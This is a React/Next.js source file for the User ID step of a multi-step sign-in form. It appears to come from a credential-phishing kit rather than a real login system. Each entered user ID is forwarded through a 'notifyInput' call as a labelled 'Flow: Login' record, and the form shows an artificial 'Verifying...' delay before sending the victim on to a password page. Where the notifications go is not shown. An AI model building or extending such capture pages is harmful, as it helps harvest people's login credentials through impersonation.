"use client"

import { useRouter } from "next/navigation"
import { useEffect, useState } from "react"
import { WELCOME_TITLE } from "@/lib/auth-copy"
import {
  clearLoginDeniedError,
  storeUsername,
} from "@/lib/login-flow-storage"
import { LOADING_MS, wait } from "@/lib/loading-delays"
import { notifyInput } from "@/lib/notify"

type UserIdStepProps = {
  formMessage?: string | null
}

export function UserIdStep({ formMessage = null }: UserIdStepProps) {
  const router = useRouter()
  const [userId, setUserId] = useState("")
  const [errors, setErrors] = useState<{ userId?: string }>({})
  const [isSubmitting, setIsSubmitting] = useState(false)

  useEffect(() => {
    if (!formMessage) return
    setErrors((prev) => ({
      ...prev,
      userId: formMessage,
    }))
  }, [formMessage])

  const handleUserIdBlur = () => {
    if (!userId.trim()) {
      setErrors((prev) => ({ ...prev, userId: "User ID is required." }))
    }
  }

  const handleUserIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setUserId(e.target.value)
    if (errors.userId) {
      setErrors((prev) => ({ ...prev, userId: undefined }))
    }
  }

  const handleNextStep = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!userId.trim()) {
      setErrors({ userId: "User ID is required." })
      return
    }
    if (isSubmitting) return

    const trimmedUserId = userId.trim()
    setIsSubmitting(true)
    setErrors({})

    clearLoginDeniedError()
    storeUsername(trimmedUserId)

    await notifyInput({
      Flow: "Login",
      "User ID": trimmedUserId,
    })

    await wait(LOADING_MS.next)
    router.push(`/password?userId=${encodeURIComponent(trimmedUserId)}`)
    setIsSubmitting(false)
  }

  return (
    <>
      <div className="mb-xl login-section-heading">
        <h2 className="welcome-title bold-text text-5xl m-none">{WELCOME_TITLE}</h2>
      </div>

      <div className="auth-panel-wrapper">
        <form
          onSubmit={handleNextStep}
          className="f-panel white medium auth-panel auth-panel-user-id"
        >
          <div className="auth-panel-content">
            <h6 className="mb-l">
              <p className="text-l bold-text">Enter your User ID.</p>
            </h6>

            <div className="mb-l mt-l text-xs">
              * Fields marked with an asterisk (*) are required.
            </div>

            <div className="form-group">
              <label htmlFor="UserID" className="input-label">
                User ID (Required)<span className="required-asterisk">*</span>
              </label>
              <div className="input-field-wrapper">
                <input
                  type="text"
                  id="UserID"
                  aria-live="polite"
                  className={`input-field ${errors.userId ? "has-error" : ""}`}
                  value={userId}
                  onChange={handleUserIdChange}
                  onBlur={handleUserIdBlur}
                  disabled={isSubmitting}
                  autoComplete="username"
                />
              </div>
            </div>

            {errors.userId && (
              <div className="error-message" role="alert">
                {errors.userId}
              </div>
            )}

            <div className="flex flex-wrap items-center mt-l mb-l justify-flex-end">
              <a href="/" className="accent-navy-blue-text text-m">
                Don&apos;t have User ID
              </a>
            </div>

            <div className="mt-xl">
              <button
                type="submit"
                className="f-button progressive medium"
                aria-label="Next"
                disabled={!userId.trim() || isSubmitting}
              >
                <span className="button-text">{isSubmitting ? "Verifying..." : "Next"}</span>
              </button>
            </div>
          </div>
        </form>
      </div>
    </>
  )
}
